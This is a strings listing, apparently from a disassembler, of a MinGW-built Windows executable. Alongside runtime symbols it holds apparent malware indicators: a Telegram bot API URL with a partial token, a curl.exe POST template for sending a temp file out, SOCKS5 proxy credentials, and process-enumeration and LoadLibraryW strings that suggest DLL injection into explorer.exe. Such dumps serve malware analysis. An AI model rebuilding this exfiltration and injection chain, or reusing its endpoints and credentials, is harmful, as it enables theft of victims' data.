@@ -1,0 +1,380 @@
+- !This program cannot be run in DOS mode.
+- `.data
+- .rdata
+- @.pdata
+- @.xdata
+- .idata
+- @.reloc
+- =CCG u
+- AWAVAUATUWVSH
+- X[^_]A\A]A^A_
+- 8MZuJHcP<H
+- AVWVSH
+- UAVAUATWVSH
+- [^_A\A]A^]
+- ([^_]H
+- @' t	H
+- .edata
+- @.idata
+- .reloc
+- AVATUWVS
+- TestpassI
+- [^_]A\A^A_
+- h;\$Xs#I
+- J(A;J,}4Hc
+- I(D;I,}FIc
+- <_t`<ntT
+- R(A;R,}-Hc
+- ATUWVSH
+- P[^_]A\
+- _GLOBAL_H9
+- BHA;R,}VHc
+- C8;C<|
+- X[^_A^
+- 0[^_]A\
+- R(A;R,}
+- AVUWVSH
+- P[^_]A^
+- U(;U,}:Hc
+- <Et6<Qt2H
+- D$0<Qt@H
+- <st\<f
+- AVAUATUWVSH
+- 0[^_]A\A]A^
+- C8;C<}ZH
+- C(;C,}3Lc
+- C(;C,L
+- D$ }hLc
+- AWAVATUWVSH
+- `[^_]A\
+- UAWAVAUATWVSH
+- 0<	w5A
+- [^_A\A]A^A_]
+- H[^_A^
+- ~D$8fH
+- @$A9@(~
+- C$9C(~
+- @[^_]A\
+- S$9S(~
+- UAVWVSH
+- [^_A^]
+- =UUUUw
+- [^_]A\A]A^A_
+- IcP$fA
+- HcC$fA
+- LcC$fB
+- HcS$fA
+- 8[^_]A\A]A^A_
+- D$L)D$X
+- L$8HcD$L;A
+- D$X+D$`
+- ATUWVSLcY
+- [^_]A\
+- [^_]A\A]A^
+- AUATUWVSH
+- ([^_]A\A]
+- WVSHcA
+- H[^_]H
+- H[^_]A\A]
+- H[^_]A\A]H
+- ([^_A^H
+- {"ea": 460296, "summary": "%s\\dl%lu.dll"}
+- {"ea": 480856, "summary": "<?xml version=\"1..ty>\n</assembly>\n"}
+- {"ea": 460322, "summary": "explorer.exe"}
+- {"ea": 634054, "summary": "__imp_CreateToolhelp32Snapshot"}
+- {"ea": 460335, "summary": "kernel32.dll"}
+- {"ea": 474028, "summary": "CreateToolhelp32Snapshot"}
+- {"ea": 630198, "summary": "CreateToolhelp32Snapshot"}
+- {"ea": 461064, "summary": "%d bit pseudo re..g the value %p.\n"}
+- {"ea": 630413, "summary": "__imp_Process32Next"}
+- {"ea": 460960, "summary": "  Unknown pseudo..col version %d.\n"}
+- {"ea": 460864, "summary": "  VirtualQuery f..es at address %p"}
+- {"ea": 474368, "summary": "Process32Next"}
+- {"ea": 634299, "summary": "Process32Next"}
+- {"ea": 475232, "summary": "api-ms-win-crt-e..nment-l1-1-0.dll"}
+- {"ea": 460656, "summary": "The result is to..nted (UNDERFLOW)"}
+- {"ea": 475612, "summary": "api-ms-win-crt-string-l1-1-0.dll"}
+- {"ea": 475496, "summary": "api-ms-win-crt-r..ntime-l1-1-0.dll"}
+- {"ea": 475400, "summary": "api-ms-win-crt-p..ivate-l1-1-0.dll"}
+- {"ea": 475560, "summary": "api-ms-win-crt-stdio-l1-1-0.dll"}
+- {"ea": 475324, "summary": "api-ms-win-crt-locale-l1-1-0.dll"}
+- {"ea": 460920, "summary": "  VirtualProtect..d with code 0x%x"}
+- {"ea": 460480, "summary": "Argument domain error (DOMAIN)"}
+- {"ea": 475364, "summary": "api-ms-win-crt-math-l1-1-0.dll"}
+- {"ea": 460616, "summary": "Total loss of si..ificance (TLOSS)"}
+- {"ea": 460348, "summary": "LoadLibraryW"}
+- {"ea": 461016, "summary": "  Unknown pseudo..on bit size %d.\n"}
+- {"ea": 475288, "summary": "api-ms-win-crt-heap-l1-1-0.dll"}
+- {"ea": 460511, "summary": "Argument singularity (SIGN)"}
+- {"ea": 460832, "summary": "Address %p has no image-section"}
+- {"ea": 460800, "summary": "Mingw-w64 runtime failure:\n"}
+- {"ea": 460710, "summary": "Unknown error"}
+- {"ea": 460728, "summary": "_matherr(): %s i..g)  (retval=%g)\n"}
+- {"ea": 461152, "summary": "runtime error %d\n"}
+- {"ea": 475212, "summary": "KERNEL32.dll"}
+- {"ea": 460576, "summary": "Partial loss of ..ificance (PLOSS)"}
+- {"ea": 124544, "summary": "https://api.telegram.org/bot"}
+- {"ea": 124736, "summary": "\"%s\" -X POST --s..ctet-stream \"%s\""}
+- {"ea": 436940, "summary": ".pdata$_ZNK10__c.._dyncast_resultE"}
+- {"ea": 436805, "summary": ".xdata$_ZNK10__c.._dyncast_resultE"}
+- {"ea": 436671, "summary": ".text$_ZNK10__cx.._dyncast_resultE"}
+- {"ea": 435749, "summary": "_ZNK10__cxxabiv1.._dyncast_resultE"}
+- {"ea": 460544, "summary": "Overflow range error (OVERFLOW)"}
+- {"ea": 430529, "summary": ".xdata$_ZNK10__c.._dyncast_resultE"}
+- {"ea": 430643, "summary": ".pdata$_ZNK10__c.._dyncast_resultE"}
+- {"ea": 430416, "summary": ".text$_ZNK10__cx.._dyncast_resultE"}
+- {"ea": 437185, "summary": ".xdata$_ZNK10__c..__upcast_resultE"}
+- {"ea": 437075, "summary": ".text$_ZNK10__cx..__upcast_resultE"}
+- {"ea": 437296, "summary": ".pdata$_ZNK10__c..__upcast_resultE"}
+- {"ea": 125056, "summary": "socks5://oWWV0o:...122.192.59:8000"}
+- {"ea": 429425, "summary": "_ZNK10__cxxabiv1.._dyncast_resultE"}
+- {"ea": 436570, "summary": ".pdata$_ZNK10__c..ss_type_infoES2_"}
+- {"ea": 435877, "summary": "_ZNK10__cxxabiv1..__upcast_resultE"}
+- {"ea": 124448, "summary": "C:\\Windows\\System32\\curl.exe"}
+- {"ea": 436469, "summary": ".xdata$_ZNK10__c..ss_type_infoES2_"}
+- {"ea": 433085, "summary": ".text$_ZN10__cxx..5_Unwind_Context"}
+- {"ea": 152824, "summary": "api-ms-win-crt-e..nment-l1-1-0.dll"}
+- {"ea": 436369, "summary": ".text$_ZNK10__cx..ss_type_infoES2_"}
+- {"ea": 433173, "summary": ".xdata$_ZN10__cx..5_Unwind_Context"}
+- {"ea": 433262, "summary": ".pdata$_ZN10__cx..5_Unwind_Context"}
+- {"ea": 430844, "summary": ".xdata$_ZNK10__c..__upcast_resultE"}
+- {"ea": 430932, "summary": ".pdata$_ZNK10__c..__upcast_resultE"}
+- {"ea": 431733, "summary": "_ZN10__cxxabiv1L..5_Unwind_Context"}
+- {"ea": 435655, "summary": "_ZNK10__cxxabiv1..ss_type_infoES2_"}
+- {"ea": 430757, "summary": ".text$_ZNK10__cx..__upcast_resultE"}
+- {"ea": 153184, "summary": "api-ms-win-crt-string-l1-1-0.dll"}
+- {"ea": 152968, "summary": "api-ms-win-crt-p..ivate-l1-1-0.dll"}
+- {"ea": 153224, "summary": "api-ms-win-crt-u..ility-l1-1-0.dll"}
+- {"ea": 124608, "summary": "8602432148:AAGpo..DQ7S3TlggkEMOVQE"}
+- {"ea": 429532, "summary": "_ZNK10__cxxabiv1..__upcast_resultE"}
+- {"ea": 153040, "summary": "api-ms-win-crt-r..ntime-l1-1-0.dll"}
+- {"ea": 152916, "summary": "api-ms-win-crt-locale-l1-1-0.dll"}
+- {"ea": 434981, "summary": ".pdata$_ZL23__gx..Unwind_Exception"}
+- {"ea": 429986, "summary": ".xdata$_ZNK10__c..srcExPKvPKS0_S2_"}
+- {"ea": 434904, "summary": ".xdata$_ZL23__gx..Unwind_Exception"}
+- {"ea": 430064, "summary": ".pdata$_ZNK10__c..srcExPKvPKS0_S2_"}
+- {"ea": 152784, "summary": "api-ms-win-crt-c..nvert-l1-1-0.dll"}
+- {"ea": 153112, "summary": "api-ms-win-crt-stdio-l1-1-0.dll"}
+- {"ea": 438079, "summary": ".pdata$_ZNKSt9ty..ss_type_infoEPPv"}
+- {"ea": 186060, "summary": "\nGNU C99 16.1.0 ..u99 -fno-builtin"}
+- {"ea": 189875, "summary": ":GNU C99 16.1.0 ..u99 -fno-builtin"}
+- {"ea": 438003, "summary": ".xdata$_ZNKSt9ty..ss_type_infoEPPv"}
+- {"ea": 437928, "summary": ".text$_ZNKSt9typ..ss_type_infoEPPv"}
+- {"ea": 202156, "summary": ";GNU C99 16.1.0 ..u99 -fno-builtin"}
+- {"ea": 232058, "summary": "\nGNU C99 16.1.0 ..u99 -fno-builtin"}
+- {"ea": 170400, "summary": "*GNU C99 16.1.0 ..u99 -fno-builtin"}
+- {"ea": 185122, "summary": "\nGNU C99 16.1.0 ..u99 -fno-builtin"}
+- {"ea": 429909, "summary": ".text$_ZNK10__cx..srcExPKvPKS0_S2_"}
+- {"ea": 513228, "summary": "*GNU C99 16.1.0 ..u99 -fno-builtin"}
+- {"ea": 535023, "summary": "\nGNU C99 16.1.0 ..u99 -fno-builtin"}
+- {"ea": 493068, "summary": "?GNU C99 16.1.0 ..u99 -fno-builtin"}
+- {"ea": 229195, "summary": "\nGNU C99 16.1.0 ..u99 -fno-builtin"}
+- {"ea": 221637, "summary": ".GNU C99 16.1.0 ..u99 -fno-builtin"}
+- {"ea": 434828, "summary": ".text$_ZL23__gxx..Unwind_Exception"}
+- {"ea": 156716, "summary": "2GNU C99 16.1.0 ..u99 -fno-builtin"}
+- {"ea": 509565, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 512107, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 531912, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 176524, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 533543, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 520084, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 520233, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 531741, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 505608, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 525974, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 526124, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 188677, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 163258, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 534444, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 429192, "summary": "_ZNK10__cxxabiv1..srcExPKvPKS0_S2_"}
+- {"ea": 507273, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 509414, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 166281, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 179891, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 526288, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 431361, "summary": ".pdata$_ZNK10__c..St9type_infoPPvj"}
+- {"ea": 431287, "summary": ".xdata$_ZNK10__c..St9type_infoPPvj"}
+- {"ea": 187005, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 538669, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 170242, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 434703, "summary": "_ZL23__gxx_excep..Unwind_Exception"}
+- {"ea": 503677, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 508997, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 508843, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 512907, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 187507, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 513070, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 231747, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 526509, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 179356, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 220779, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 523142, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 188083, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 536674, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 179506, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 230025, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 152880, "summary": "api-ms-win-crt-heap-l1-1-0.dll"}
+- {"ea": 534756, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 179670, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 532722, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 228386, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 519352, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 189290, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 167851, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 169853, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 215998, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 164616, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 230846, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 511567, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 214626, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 511718, "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"}
+- {"ea": 432945, "summary": ".xdata$_ZL17pars..lsda_header_info"}
+- {"ea": 432876, "summary": ".text$_ZL17parse..lsda_header_info"}
+- {"ea": 433015, "summary": ".pdata$_ZL17pars..lsda_header_info"}
+- {"ea": 431214, "summary": ".text$_ZNK10__cx..St9type_infoPPvj"}
+- {"ea": 437518, "summary": "_ZNKSt9type_info..ss_type_infoEPPv"}
+- {"ea": 570880, "summary": "D:\\W\\B\\src\\build-UCRT64"}
+- {"ea": 429704, "summary": "_ZNK10__cxxabiv1..St9type_infoPPvj"}
+- {"ea": 431670, "summary": "_ZL17parse_lsda_..lsda_header_info"}
+- {"ea": 432670, "summary": ".text$_ZL20check..KSt9type_infoPvx"}
+- {"ea": 432738, "summary": ".xdata$_ZL20chec..KSt9type_infoPvx"}
+- {"ea": 432807, "summary": ".pdata$_ZL20chec..KSt9type_infoPvx"}
+- {"ea": 438721, "summary": ".data$_ZZN9__gnu..EvE11terminating"}
+- {"ea": 431084, "summary": ".xdata$_ZNK10__c.._upcastEPKS0_PPv"}
+- {"ea": 431149, "summary": ".pdata$_ZNK10__c.._upcastEPKS0_PPv"}
+- {"ea": 438506, "summary": "_ZZN9__gnu_cxx27..EvE11terminating"}
+- {"ea": 456030, "summary": "__lib64_libapi_m..t_l1_1_0_a_iname"}
+- {"ea": 431020, "summary": ".text$_ZNK10__cx.._upcastEPKS0_PPv"}
+- {"ea": 431608, "summary": "_ZL20check_excep..KSt9type_infoPvx"}
+- {"ea": 633674, "summary": "__lib64_libapi_m..t_l1_1_0_a_iname"}
+- {"ea": 441056, "summary": ".text$_ZN9__gnu_..e_unlock_errorEv"}
+- {"ea": 631998, "summary": "__lib64_libapi_m..e_l1_1_0_a_iname"}
+- {"ea": 429613, "summary": "_ZNK10__cxxabiv1.._upcastEPKS0_PPv"}
+- {"ea": 566784, "summary": "Subsystem"}
+- {"ea": 452791, "summary": "__lib64_libapi_m..e_l1_1_0_a_iname"}
+- {"ea": 442477, "summary": ".xdata$_ZN9__gnu..e_unlock_errorEv"}
+- {"ea": 632856, "summary": "__lib64_libapi_m..e_l1_1_0_a_iname"}
+- {"ea": 454689, "summary": "__lib64_libapi_m..e_l1_1_0_a_iname"}
+- {"ea": 127664, "summary": "std::basic_strin..llocator<char> >"}
+- {"ea": 433832, "summary": ".rdata$.refptr._..minate_handlerEv"}
+- {"ea": 443439, "summary": ".text.startup._G.._cxx9__freeresEv"}
+- {"ea": 440235, "summary": ".text$_ZNK9__gnu..ock_error4whatEv"}
+- {"ea": 440904, "summary": ".text$_ZN9__gnu_..nce_lock_errorEv"}
+- {"ea": 441112, "summary": "_ZN9__gnu_cxx32_..e_unlock_errorEv"}
+- {"ea": 455274, "summary": "__lib64_libapi_m..y_l1_1_0_a_iname"}
+- {"ea": 441694, "summary": ".xdata$_ZNK9__gn..ock_error4whatEv"}
+- {"ea": 442367, "summary": ".xdata$_ZN9__gnu..nce_lock_errorEv"}
+- {"ea": 442534, "summary": ".pdata$_ZN9__gnu..e_unlock_errorEv"}
+- {"ea": 443494, "summary": ".xdata.startup._.._cxx9__freeresEv"}
+- {"ea": 443550, "summary": ".pdata.startup._.._cxx9__freeresEv"}
+- {"ea": 458152, "summary": "__lib64_libapi_m..e_l1_1_0_a_iname"}
+- {"ea": 456283, "summary": "__lib64_libapi_m..t_l1_1_0_a_iname"}
+- {"ea": 631458, "summary": "_head_lib64_liba..ronment_l1_1_0_a"}
+- {"ea": 452058, "summary": "_head_lib64_liba..ronment_l1_1_0_a"}
+- {"ea": 631732, "summary": "__lib64_libapi_m..g_l1_1_0_a_iname"}
+- {"ea": 452465, "summary": "__lib64_libapi_m..g_l1_1_0_a_iname"}
+- {"ea": 634780, "summary": "__lib64_libapi_m..e_l1_1_0_a_iname"}
+- {"ea": 440485, "summary": ".text$_ZN9__gnu_..unlock_errorD1Ev"}
+- {"ea": 440958, "summary": "_ZN9__gnu_cxx30_..nce_lock_errorEv"}
+- {"ea": 440133, "summary": ".text$_ZNK9__gnu..ock_error4whatEv"}
+- {"ea": 441584, "summary": ".xdata$_ZNK9__gn..ock_error4whatEv"}
+- {"ea": 441751, "summary": ".pdata$_ZNK9__gn..ock_error4whatEv"}
+- {"ea": 440729, "summary": ".text$_ZN9__gnu_..unlock_errorD0Ev"}
+- {"ea": 442422, "summary": ".pdata$_ZN9__gnu..nce_lock_errorEv"}
+- {"ea": 633998, "summary": "__lib64_libapi_m..p_l1_1_0_a_iname"}
+- {"ea": 633898, "summary": "__lib64_libapi_m..o_l1_1_0_a_iname"}
+- {"ea": 454583, "summary": "_pthread_get_sys..est_as_file_time"}
+- {"ea": 451247, "summary": "_ZTSN9__gnu_cxx2..ce_unlock_errorE"}
+- {"ea": 135936, "summary": "N9__gnu_cxx26__c..ce_unlock_errorE"}
+- {"ea": 456643, "summary": "__lib64_libapi_m..p_l1_1_0_a_iname"}
+- {"ea": 451970, "summary": "_ZTIN9__gnu_cxx2..ce_unlock_errorE"}
+- {"ea": 433684, "summary": ".rdata$.refptr._..xpected_handlerE"}
+- {"ea": 452997, "summary": "_ZTVN9__gnu_cxx2..ce_unlock_errorE"}
+- {"ea": 456482, "summary": "__lib64_libapi_m..o_l1_1_0_a_iname"}
+- {"ea": 631334, "summary": "__lib64_libapi_m..h_l1_1_0_a_iname"}
+- {"ea": 441910, "summary": ".xdata$_ZN9__gnu..unlock_errorD1Ev"}
+- {"ea": 165093, "summary": "JOB_OBJECT_NET_R..OL_MAX_BANDWIDTH"}
+- {"ea": 630070, "summary": "_head_lib64_liba..private_l1_1_0_a"}
+- {"ea": 634603, "summary": "_head_lib64_liba..runtime_l1_1_0_a"}
+- {"ea": 441639, "summary": ".pdata$_ZNK9__gn..ock_error4whatEv"}
+- {"ea": 453427, "summary": "_head_lib64_liba..utility_l1_1_0_a"}
+- {"ea": 159848, "summary": "JOB_OBJECT_NET_R..OL_MAX_BANDWIDTH"}
+- {"ea": 457791, "summary": "_head_lib64_liba..runtime_l1_1_0_a"}
+- {"ea": 535552, "summary": "JOB_OBJECT_NET_R..OL_MAX_BANDWIDTH"}
+- {"ea": 441963, "summary": ".pdata$_ZN9__gnu..unlock_errorD1Ev"}
+- {"ea": 442118, "summary": ".xdata$_ZN9__gnu..unlock_errorD0Ev"}
+- {"ea": 442171, "summary": ".pdata$_ZN9__gnu..unlock_errorD0Ev"}
+- {"ea": 433577, "summary": ".rdata$.refptr._..rminate_handlerE"}
+- {"ea": 537273, "summary": "JOB_OBJECT_NET_R..OL_MAX_BANDWIDTH"}
+- {"ea": 441507, "summary": ".rdata$_ZTSN9__g..ce_unlock_errorE"}
+- {"ea": 454149, "summary": "_head_lib64_liba.._locale_l1_1_0_a"}
+- {"ea": 632713, "summary": "_head_lib64_liba.._string_l1_1_0_a"}
+- {"ea": 441162, "summary": ".rdata$_ZTIN9__g..ce_unlock_errorE"}
+- {"ea": 440291, "summary": "_ZNK9__gnu_cxx26..ock_error4whatEv"}
+- {"ea": 450116, "summary": "_head_lib64_liba..private_l1_1_0_a"}
+- {"ea": 440341, "summary": ".text$_ZN9__gnu_..e_lock_errorD1Ev"}
+- {"ea": 166730, "summary": "JOB_OBJECT_NET_R..OL_MAX_BANDWIDTH"}
+- {"ea": 440537, "summary": "_ZN9__gnu_cxx26_..unlock_errorD1Ev"}
+- {"ea": 440583, "summary": ".rdata$_ZTVN9__g..ce_unlock_errorE"}
+- {"ea": 440635, "summary": ".text$_ZN9__gnu_..e_lock_errorD0Ev"}
+- {"ea": 632635, "summary": "_head_lib64_liba.._locale_l1_1_0_a"}
+- {"ea": 440781, "summary": "_ZN9__gnu_cxx26_..unlock_errorD0Ev"}
+- {"ea": 171193, "summary": "JOB_OBJECT_NET_R..OL_MAX_BANDWIDTH"}
+- {"ea": 127912, "summary": "std::basic_iostr..r_traits<char> >"}
+- {"ea": 496468, "summary": "JOB_OBJECT_NET_R..OL_MAX_BANDWIDTH"}
+- {"ea": 232587, "summary": "JOB_OBJECT_NET_R..OL_MAX_BANDWIDTH"}
+- {"ea": 124514, "summary": "%s\\tmp%lu.dat"}
+- {"ea": 134439, "summary": "kernelbase.dll"}
+- {"ea": 630645, "summary": "__imp__set_inval..arameter_handler"}
+- {"ea": 454427, "summary": "_head_lib64_liba..convert_l1_1_0_a"}
+- {"ea": 222308, "summary": "JOB_OBJECT_NET_R..OL_MAX_BANDWIDTH"}
+- {"ea": 454299, "summary": "_head_lib64_liba.._string_l1_1_0_a"}
+- {"ea": 132712, "summary": "%d bit pseudo re..g the value %p.\n"}
+- {"ea": 514021, "summary": "JOB_OBJECT_NET_R..OL_MAX_BANDWIDTH"}
+- {"ea": 177181, "summary": "JOB_OBJECT_NET_R..OL_MAX_BANDWIDTH"}
+- {"ea": 507722, "summary": "JOB_OBJECT_NET_R..OL_MAX_BANDWIDTH"}
+- {"ea": 523799, "summary": "JOB_OBJECT_NET_R..OL_MAX_BANDWIDTH"}
+- {"ea": 506085, "summary": "JOB_OBJECT_NET_R..OL_MAX_BANDWIDTH"}
+- {"ea": 127832, "summary": "std::basic_ostre..r_traits<char> >"}
+- {"ea": 232670, "summary": "JOB_OBJECT_NET_R..TROL_VALID_FLAGS"}
+- {"ea": 441457, "summary": ".rdata$_ZTSN9__g..ence_lock_errorE"}
+- {"ea": 632258, "summary": "_head_lib64_liba..rt_heap_l1_1_0_a"}
+- {"ea": 453521, "summary": "_head_lib64_liba..rt_heap_l1_1_0_a"}
+- {"ea": 441006, "summary": ".rdata$_ZTIN9__g..ence_lock_errorE"}
+- {"ea": 232631, "summary": "JOB_OBJECT_NET_R..CONTROL_DSCP_TAG"}
+- {"ea": 628050, "summary": ".rdata$.refptr._..ve_startup_state"}
+- {"ea": 535596, "summary": "JOB_OBJECT_NET_R..CONTROL_DSCP_TAG"}
+- {"ea": 577462, "summary": "D:/W/B/src/mingw..ngw-w64-crt/misc"}
+- {"ea": 523882, "summary": "JOB_OBJECT_NET_R..TROL_VALID_FLAGS"}
+- {"ea": 523843, "summary": "JOB_OBJECT_NET_R..CONTROL_DSCP_TAG"}
+- {"ea": 177264, "summary": "JOB_OBJECT_NET_R..TROL_VALID_FLAGS"}
+- {"ea": 577206, "summary": "D:/W/B/src/mingw..ngw-w64-crt/misc"}
+- {"ea": 441808, "summary": ".xdata$_ZN9__gnu..e_lock_errorD1Ev"}
+- {"ea": 535635, "summary": "JOB_OBJECT_NET_R..TROL_VALID_FLAGS"}
+- {"ea": 443401, "summary": ".pdata$__cxa_fre..endent_exception"}
+- {"ea": 442016, "summary": ".xdata$_ZN9__gnu..e_lock_errorD0Ev"}
+- {"ea": 443363, "summary": ".xdata$__cxa_fre..endent_exception"}
+- {"ea": 455151, "summary": "_head_lib64_liba..t_stdio_l1_1_0_a"}
+- {"ea": 507805, "summary": "JOB_OBJECT_NET_R..TROL_VALID_FLAGS"}
+- {"ea": 453999, "summary": "_ZTIN9__gnu_cxx2..ence_lock_errorE"}
+- {"ea": 507766, "summary": "JOB_OBJECT_NET_R..CONTROL_DSCP_TAG"}
+- {"ea": 222352, "summary": "JOB_OBJECT_NET_R..CONTROL_DSCP_TAG"}
+- {"ea": 171237, "summary": "JOB_OBJECT_NET_R..CONTROL_DSCP_TAG"}
+- {"ea": 222391, "summary": "JOB_OBJECT_NET_R..TROL_VALID_FLAGS"}
+- {"ea": 166813, "summary": "JOB_OBJECT_NET_R..TROL_VALID_FLAGS"}
+- {"ea": 135872, "summary": "N9__gnu_cxx24__c..ence_lock_errorE"}
+- {"ea": 166774, "summary": "JOB_OBJECT_NET_R..CONTROL_DSCP_TAG"}
+- {"ea": 426920, "summary": ".rdata$.refptr._..ve_startup_state"}
+- {"ea": 496512, "summary": "JOB_OBJECT_NET_R..CONTROL_DSCP_TAG"}
+- {"ea": 297996, "summary": "D:/W/B/src/mingw..w-w64-crt/libsrc"}
+- {"ea": 127752, "summary": "std::basic_istre..r_traits<char> >"}
+- {"ea": 171276, "summary": "JOB_OBJECT_NET_R..TROL_VALID_FLAGS"}
+- {"ea": 168460, "summary": "\tJOB_OBJECT_NET_..OL_MAX_BANDWIDTH"}
+- {"ea": 575797, "summary": "D:/W/B/src/mingw..ngw-w64-crt/misc"}
+- {"ea": 447334, "summary": ".rdata$.refptr._..RELOC_LIST_END__"}
+- {"ea": 165137, "summary": "JOB_OBJECT_NET_R..CONTROL_DSCP_TAG"}
+- {"ea": 165176, "summary": "JOB_OBJECT_NET_R..TROL_VALID_FLAGS"}
+- {"ea": 159892, "summary": "JOB_OBJECT_NET_R..CONTROL_DSCP_TAG"}
+- {"ea": 440435, "summary": ".rdata$_ZTVN9__g..ence_lock_errorE"}
+- {"ea": 440391, "summary": "_ZN9__gnu_cxx24_..e_lock_errorD1Ev"}
+- {"ea": 440187, "summary": "_ZNK9__gnu_cxx24..ock_error4whatEv"}
